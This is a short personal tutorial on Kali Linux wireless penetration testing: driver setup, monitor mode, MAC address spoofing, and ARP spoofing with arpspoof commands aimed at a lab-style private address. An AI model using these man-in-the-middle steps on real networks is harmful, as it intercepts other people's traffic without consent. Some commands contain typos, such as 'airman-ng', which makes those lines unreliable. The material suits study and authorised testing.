# Network Hacking

We use Kali Linux for penetration tests. It is also possible to use Ubuntu or other Linux distributions but we need to manually install many tools.

## 1. Install the driver for wireless network card

The RTL8812AU chipset requires a specific driver, and check if the driver is installed using the following command.

```bash
lsmod | grep 8812au
```

If the driver is not installed, install it with a simple `apt install realtek-rtl88xxau-dkms`.

```bash
sudo apt update
sudo apt install dkms build-essential linux-headers-$(uname -r) git

# Install the driver with this command. I almost spent 4 hours to find this line of command to make it work.
sudo apt install realtek-rtl88xxau-dkms

# The method below is recommended by many people but it does not work for the current version. The driver will make the wireless adaptor not able to show available networks.
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
sudo make dkms_install
```

### Linux Header and system problems

The above command may fail due to linux-header problems for a newly installed kali linux.

```bash
apt search linux-header
# The version can be a problem, install the one that can be found.
sudo apt install linux-header-6.11.2
```

## 2. Connect to a wireless network normally

```bash
sudo iw dev wlan0 scan | grep SSID
sudo wpa_passphrase "Your_SSID" "Your_PASSWORD" > /etc/wpa_supplicant.conf
sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant.conf
sudo dhclient wlan0
```

## 3. Normal Mode vs Monitor Mode

Monitor mode allows your interface to get packets that are not meant to be sent to you in the network.

```bash
# Kill the network
airman-ng check kill

# Set the interface to monitor mode
sudo iw dev wlan0 set type monitor

# old way
# sudo iwconfig wlan0 mode monitor
```

## 4. Manually Set Mac Address & Mac Address Reset Error

Use the following commands to manually set the Mac Address for the wireless interface.

```bash
ip link show # check the wireless interface

sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

sudo ip link set wlan0 down

# change the mode to monitor
sudo iw dev wlan0 set type monitor
# change the mac address: (1) has to be monitor mode; (2) other management program needs to be killed --- NetworkManager, wpa_supplicant
sudo ip link set dev wlan0 address 00:11:22:33:44:55
sudo ip link set wlan0 up

# check if the mode and MAC address is correct
sudo iw dev wlan0 info
```

The old way is to use `ifconfig`, no longer recommended.

> The recommended way is `ip` and `iw` command.

```bash
sudo ifconfig wlan0 down

sudo ifconfig wlan0 hw ether 00:11:22:33:44:55

sudo ifconfig wlan0 up
```

## Prevent MAC address from being reset

Add the following two lines at the end of `/etc/NetowrkManager/NetworkManager.conf` file to prevent the Network Manager from resetting MAC address.

```bash
[device]
wifi.scan-rand-mac-address=no

[connection]
wifi.cloned-mac-address=preserve
```

## Arp Spoofing

After gaining access to the network, we can target a machine and do ARP spoofing.

```bash
# enable port forwarding to make the target machine not sensible of us as a middle man.
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```

```bash
# run the following two commands at the same time to become a middleman.
sudo arpspoof -i eth0 -t 192.168.211.130 192.168.211.1
sudo arpspoof -i eth0 -t 192.168.211.1 192.168.211.130
```

In this way, all the traffic from the target machine will go through us.
